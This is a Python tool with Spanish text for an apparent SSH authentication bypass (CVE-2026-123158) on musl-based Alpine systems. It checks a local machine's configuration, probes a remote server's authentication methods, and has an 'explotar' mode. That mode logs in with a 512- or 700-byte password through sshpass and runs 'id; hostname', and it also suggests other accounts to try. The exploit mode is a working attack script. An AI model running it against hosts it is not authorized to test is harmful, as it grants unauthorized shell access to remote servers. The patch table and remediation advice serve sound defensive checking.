#!/usr/bin/env python3
"""*sshole (CVE-2026-123158) — bypass de autenticación en sshd sobre musl.

Causa raíz (Cycode/Orca, 2026-11-05; modelo corregido por la revisión
Codex gpt-6.1-sol): musl libc hace que crypt() devuelva la cadena "*"
cuando falla (desde 2012), y sus SHA-256/512-crypt rechazan contraseñas
de más de 256 bytes. Las cuentas SIN contraseña guardan en shadow
EXACTAMENTE "*" (no contraseña vacía; "!" o "!!" de cuentas bloqueadas NO
coinciden). Hace falta ADEMÁS otra cuenta con hash SHA-$5$/$6$: sshd
elige con su prefijo el algoritmo y salt que aplica a la contraseña
larga. Cuando sshd comprueba la contraseña SIN PAM (por defecto en
openssh-server de Alpine), una contraseña de 257-1024 bytes INCLUSIVOS
hace fallar crypt(), que devuelve "*", que COINCIDE con el campo
almacenado: login aceptado (auth_password rechaza >1024 por strlen, no
recorta). keyboard-interactive en OpenSSH/Linux usa PAM: NO es vector —
solo el método exacto "password". root NO es acceso universal:
PermitRootLogin prohibit-password protege la cuenta aunque cumpla el
resto. glibc (Debian/Ubuntu/Fedora), sshd con PAM y Dropbear NO están
afectados. Alpine <3.16 puede ser vulnerable pero carece de backport.

Comprobación local:  --sistema
Comprobación remota: --host H [--puerto 22] [--usuario root]
Explotación:         --host H --explotar [--usuario U] [--longitud N]
                     (contraseña larga vía SSHPASS, nunca por argv;
                     2 intentos acotados o 1 con --longitud)

Salidas: 0 hallazgo (EXPUESTO/BYPASS_CONFIRMADO), 1 negativo o
configuración mitigada, 2 uso, 3 inconcluyente (CANDIDATO,
BYPASS_NO_CONFIRMADO, LOGIN_ACEPTADO_NO_ATRIBUIDO, sonda fallida).
"""
import argparse
import os
import re
import shutil
import subprocess
import socket
import sys
import time

# rama Alpine -> version openssh del fix (tabla de Cycode 2026-11-05)
FIJOS = {
    "edge": "10.6_p2-r0", "3.24": "10.3_p1-r2", "3.23": "10.2_p1-r1",
    "3.22": "10.0_p1-r11", "3.21": "9.9_p2-r1", "3.20": "9.7_p1-r6",
    "3.19": "9.6_p1-r3", "3.18": "9.3_p2-r4", "3.17": "9.1_p1-r7",
    "3.16": "9.0_p1-r6",
}
# ventana 257-1024 inclusiva; --longitud permite controles de frontera
LONGITUDES = (256, 257, 512, 700, 1024, 1025)
# ssh aislada de la config del usuario: sin ProxyCommand, sin multiplexar
SSH_AISLADA = ["-F", "/dev/null", "-o", "ProxyCommand=none",
               "-o", "ControlPath=none", "-o", "ControlMaster=no"]


def _sh(cmd, timeout=20, env=None):
    """Sin shell; fallo de ejecucion = (3, motivo) sin traceback."""
    try:
        p = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, env=env, check=False)
    except FileNotFoundError:
        return 3, f"ejecutable ausente: {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 3, f"timeout tras {timeout} s"
    except OSError as e:
        return 3, f"error de ejecucion: {e}"
    return p.returncode, (p.stdout or "") + (p.stderr or "")


def _rama_alpine():
    try:
        v = open("/etc/alpine-release").read().strip()
        return v
    except OSError:
        return None


def check_sistema(seco):
    if seco:
        print("Plan: leer /etc/alpine-release, musl vs glibc, version de "
              "openssh contra la tabla de fixes, sshd -T "
              "(PasswordAuthentication/UsePAM/PermitRootLogin, needs root), "
              "cuentas '*' Y cuentas SHA-$5$/$6$ de shadow (la cuenta SHA "
              "es requisito: aporta algoritmo y salt); veredicto solo con "
              "todos los requisitos verificados; sin tocar el servicio")
        return 0
    rama = _rama_alpine()
    if rama is None:
        rc, out = _sh(["ldd", "--version"])
        if "musl" in out.lower():
            print("VEREDICTO: MUSL_NO_ALPINE — libc musl sin "
                  "/etc/alpine-release (OpenWrt/Buildroot/Yocto?): el "
                  "mismo fallo de crypt() aplica; comprueba sshd a mano "
                  "(PasswordAuthentication sin PAM + cuentas '*' + "
                  "cuenta SHA)")
            return 3
        print("VEREDICTO: NO_AFECTADO — glibc (musl es el requisito del "
              "bug); crypt() de glibc no devuelve '*' al rechazar la "
              "contraseña larga")
        return 1
    rama_corta = ".".join(rama.split(".")[:2])
    fijo = FIJOS.get(rama_corta)
    rc, out = _sh(["ssh", "-V"])
    m = re.search(r"OpenSSH_(\d+\.\d+)p(\d+)", out)
    instalado = m.group(0)[7:] if m else "(?) " + out.strip()[:60]
    rc2, apk = _sh(["apk", "info", "-e", "openssh"])
    pkg = apk.strip() or "(apk info falló; ¿root?)"
    print(f"[i] Alpine {rama} (rama {rama_corta}); ssh -V: {instalado}; "
          f"paquete: {pkg}")
    print("[i] ojo: ssh -V es el CLIENTE y un paquete actualizado no "
          "demuestra que el demonio en ejecución lo esté — reinicia "
          "después de actualizar")
    fix_txt = fijo or "rama sin fix publicado (<3.16 puede ser vulnerable "
    fix_txt += "pero carece de backport; edge: actualiza a lo último)"
    print(f"[i] fix de la rama: {fix_txt}")
    if fijo:
        print(f"ACCIÓN: `apk upgrade -U -a` y `rc-service sshd restart` "
              f"(el binario nuevo no sustituye al demonio en ejecución); "
              f"objetivo: openssh >= {fijo}")
    requisitos = {}
    rc3, cfg = _sh(["sh", "-c", "sshd -T 2>/dev/null | grep -iE "
                    "'passwordauthentication|usepam|permitrootlogin'"])
    if rc3 == 0 and cfg.strip():
        for linea in cfg.strip().splitlines():
            print(f"[i] sshd -T: {linea}")
        requisitos["PasswordAuthentication yes"] = bool(
            re.search(r"passwordauthentication yes", cfg, re.I))
        requisitos["UsePAM no"] = bool(re.search(r"usepam no", cfg, re.I))
        prl = re.search(r"permitrootlogin (\S+)", cfg, re.I)
        if prl and prl.group(1).lower() == "prohibit-password":
            print("[i] PermitRootLogin prohibit-password: root queda "
                  "protegido aunque cumpla el resto — no prometas root")
    else:
        print("[i] sshd -T sin datos (ejecuta con sudo)")
        requisitos["PasswordAuthentication yes"] = None
        requisitos["UsePAM no"] = None
    rc4, shadow = _sh(["sh", "-c",
                       "awk -F: '$2==\"*\"{print $1}' /etc/shadow "
                       "2>/dev/null; echo ---; awk -F: "
                       "'$2~/^\\$5\\$|^\\$6\\$/{print $1}' /etc/shadow "
                       "2>/dev/null"])
    if rc4 == 0 and "---" in shadow:
        antes, despues = shadow.split("---", 1)
        estrellas = antes.split()
        sha = despues.split()
        print(f"[i] cuentas con campo EXACTO '*' en shadow (sin "
              f"contraseña; '!' bloqueadas no cuentan): "
              f"{', '.join(estrellas[:12]) or 'ninguna'}")
        print(f"[i] cuentas SHA-$5$/$6$ (aporte de algoritmo y salt): "
              f"{len(sha)}")
        requisitos["cuenta '*' en shadow"] = bool(estrellas)
        requisitos["cuenta SHA para selección de algoritmo"] = bool(sha)
    else:
        print("[i] /etc/shadow sin leer (sudo para ver cuentas)")
        requisitos["cuenta '*' en shadow"] = None
        requisitos["cuenta SHA para selección de algoritmo"] = None
    requisitos["rama Alpine afectada"] = bool(fijo)
    cerrados = [k for k, v in requisitos.items() if v is False]
    if cerrados:
        print("VEREDICTO: CERRADO — requisito cerrado: " + ", ".join(cerrados)
              + " (con PAM activo o PasswordAuthentication no, el vector "
              "no aplica)")
        return 1
    if all(v is True for v in requisitos.values()):
        print("VEREDICTO: EXPUESTO — todos los requisitos verificados "
              "(musl + PasswordAuthentication + UsePAM no + cuenta '*' + "
              "cuenta SHA + rama afectada): explota contra ti mismo "
              "(--host 127.0.0.1 --explotar --usuario <cuenta '*'>)")
        return 0
    sin_verificar = [k for k, v in requisitos.items() if v is None]
    print("VEREDICTO: INCONCLUYENTE — requisitos no verificados: "
          + (", ".join(sin_verificar) or "desconocidos") +
          " (sshd -T y shadow piden sudo)")
    return 3


def _banner(host, puerto):
    """Identificacion SSH (RFC 4253: saltar lineas preliminares '-'), con
    presupuesto total de tiempo y bytes; cierra siempre."""
    fin = time.monotonic() + 10
    try:
        s = socket.create_connection((host, puerto), timeout=3)
    except OSError as e:
        print(f"[i] sin banner: {e}")
        return None
    datos = b""
    try:
        s.settimeout(3)
        while time.monotonic() < fin and len(datos) < 4096:
            try:
                trozo = s.recv(1024)
            except (TimeoutError, socket.timeout):
                continue
            if not trozo:
                break
            datos += trozo
            for linea in datos.split(b"\n"):
                if linea and not linea.startswith(b"-"):
                    return linea.decode("utf-8", "replace").strip()
    except OSError:
        pass
    finally:
        s.close()
    return None


def check_host(host, puerto, usuario, seco):
    if seco:
        print(f"Plan: banner TCP de {host}:{puerto} (presupuesto 10 s/4 KiB) "
              f"+ sonda de métodos de auth con NumberOfPasswordPrompts=0 "
              f"(usuario {usuario}; método none: en servidores mal "
              "configurados podría autenticar sin más); heurístico — el "
              "backport de Alpine no se ve en el banner")
        return 0
    b = _banner(host, puerto)
    if b is None:
        print(f"INCONCLUYENTE: {host}:{puerto} no responde al banner TCP")
        return 3
    print(f"[i] banner: {b}")
    es_openssh = re.search(r"OpenSSH_", b)
    if b and "alpine" in b.lower():
        print("[i] banner con marca Alpine: musl probable")
    rc, out = _sh(["ssh"] + SSH_AISLADA + [
        "-o", "PreferredAuthentications=none",
        "-o", "PubkeyAuthentication=no", "-o", "BatchMode=yes",
        "-o", "NumberOfPasswordPrompts=0",
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", "ConnectTimeout=8", "-p", str(puerto),
        f"{usuario}@{host}", "true"])
    ofrece = re.search(r"Permission denied \(([^)]*)\)", out)
    if not ofrece:
        print("VEREDICTO: INCONCLUYENTE — no se obtuvo la lista de "
              "autenticación (conexión cortada o ssh ausente): " +
              (out.strip().splitlines()[-1][:100] if out.strip()
               else "sin detalle"))
        return 3
    metodos = ofrece.group(1)
    print(f"[i] métodos de auth ofrecidos a '{usuario}': {metodos}")
    if not es_openssh:
        print("VEREDICTO: NO_ES_OPENSSH — otro servidor (Dropbear u otro) "
              "no comparte este fallo de musl-crypt")
        return 1
    if "password" not in {m.strip() for m in metodos.split(",")}:
        print("VEREDICTO: SIN_AUTH_POR_CONTRASEÑA — keyboard-interactive "
              "usa PAM y NO es vector; sin el método exacto 'password' el "
              "vector está cerrado para esta cuenta")
        return 1
    print("VEREDICTO: CANDIDATO — sshd con auth por contraseña exacta. "
          "La versión del banner no distingue el backport de Alpine; "
          "confirma con --explotar (login con contraseña de 512 bytes) o "
          "con `sshd -T` en el propio host")
    return 3


def explotar(host, puerto, usuario, longitud, seco):
    intentos = [longitud] if longitud else [512, 700]
    if seco:
        print(f"Plan: {len(intentos)} intento(s) de login como '{usuario}' "
              f"en {host}:{puerto} con contraseña de "
              f"{'/'.join(str(n) for n in intentos)} bytes (ventana "
              "257-1024), solo método password exacto (keyboard-interactive "
              "usa PAM), config SSH aislada (-F /dev/null), comando "
              "inofensivo id;hostname. Deja 'Accepted password' en el log "
              "del objetivo si entra: eso ES el IOC buscado")
        return 0
    if shutil.which("sshpass") is None:
        print("Error: falta sshpass (apt install sshpass)")
        return 2
    b = _banner(host, puerto) or ""
    for n in intentos:
        entorno = dict(os.environ, SSHPASS="k" * n)
        rc, out = _sh(["sshpass", "-e", "ssh"] + SSH_AISLADA + [
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            "-o", "KbdInteractiveAuthentication=no",
            "-o", "NumberOfPasswordPrompts=1",
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "ConnectTimeout=10",
            "-p", str(puerto), f"{usuario}@{host}",
            "id; hostname"], timeout=30, env=entorno)
        if rc == 2 and "ejecutable ausente" in out:
            print(f"Error: {out}")
            return 2
        if rc == 0 and "uid=" in out:
            print(f"[i] intento ({n} bytes): LOGIN ACEPTADO — "
                  + out.strip().replace("\n", " | ")[:120])
            if "alpine" in b.lower():
                print("VEREDICTO: BYPASS_CONFIRMADO — login con contraseña "
                      "larga en host Alpine/musl (CVE-2026-123158). Trata "
                      "el host como comprometido: rota claves, revisa "
                      "`Accepted password for` en los logs y actualiza "
                      "openssh (apk upgrade + rc-service sshd restart)")
                return 0
            print("VEREDICTO: LOGIN_ACEPTADO_NO_ATRIBUIDO — contraseña "
                  "larga aceptada, pero rc=0+'uid=' no prueba el CVE por sí "
                  "solo: corrobora en el servidor que la cuenta tiene "
                  "shadow EXACTO '*' y que la libc es musl; si es Alpine, "
                  "es el CVE")
            return 3
        print(f"[i] intento ({n} bytes): denegado" if "denied" in out.lower()
              else f"[i] intento ({n} bytes): sin login (rc={rc}) — "
              + (out.strip().splitlines()[-1][:100] if out.strip() else ""))
        time.sleep(3)
    print("VEREDICTO: BYPASS_NO_CONFIRMADO — o el host está parcheado, o "
          "es glibc/PAM, o la cuenta sí tiene contraseña o está bloqueada "
          "('!'≠'*'), o PasswordAuthentication está apagado; desde fuera "
          "no se distingue. Prueba con otra cuenta (root en Alpine 3.16+ "
          "salvo prohibit-password, usuario 'alpine', deploy users)")
    return 3


def main(argv=None):
    ap = argparse.ArgumentParser(prog="extras_sshole.py")
    sub = ap.add_subparsers(dest="modo", required=True)
    s = sub.add_parser("sshole")
    s.add_argument("--sistema", action="store_true",
                   help="comprobar esta máquina")
    s.add_argument("--host", help="comprobar/explotar host SSH remoto")
    s.add_argument("--puerto", type=int, default=22)
    s.add_argument("--usuario", default="root")
    s.add_argument("--explotar", action="store_true",
                   help="con --host: intentar el login con contraseña "
                        "larga (2 intentos acotados)")
    s.add_argument("--longitud", type=int, choices=LONGITUDES,
                   help="longitud única de prueba (controles de frontera "
                       "de laboratorio)")
    s.add_argument("--dry-run", action="store_true")
    a = ap.parse_args(argv)
    if a.puerto < 1 or a.puerto > 65535:
        print("Error: --puerto debe estar entre 1 y 65535", file=sys.stderr)
        return 2
    if a.explotar and not a.host:
        print("Error: --explotar exige --host", file=sys.stderr)
        return 2
    if not (a.sistema or a.host):
        print("Error: indica --sistema y/o --host", file=sys.stderr)
        return 2
    resultados = []
    if a.sistema:
        resultados.append(check_sistema(a.dry_run))
    if a.host:
        if a.explotar:
            resultados.append(explotar(a.host, a.puerto, a.usuario,
                                       a.longitud, a.dry_run))
        else:
            resultados.append(check_host(a.host, a.puerto, a.usuario,
                                         a.dry_run))
    for prioridad in (0, 3):
        if prioridad in resultados:
            return prioridad
    return 1


if __name__ == "__main__":
    sys.exit(main())
